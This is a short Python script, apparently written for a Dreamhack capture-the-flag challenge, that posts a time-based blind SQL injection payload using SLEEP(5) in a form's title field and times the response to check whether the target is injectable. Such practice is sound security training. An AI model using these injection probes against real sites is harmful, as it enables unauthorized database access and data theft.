import requests, time

BASE = "http://host8.dreamhack.games:9847/"

def test_sleep():
    payload = "a' WHERE (SELECT IF(1=1,SLEEP(5),0)) -- "
    data = {"title": payload, "author": "x"}
    t0 = time.time()
    r = requests.post(BASE, data=data)
    dt = time.time() - t0
    print("Status:", r.status_code)
    print("Elapsed:", dt, "seconds")

if __name__ == "__main__":
    test_sleep()
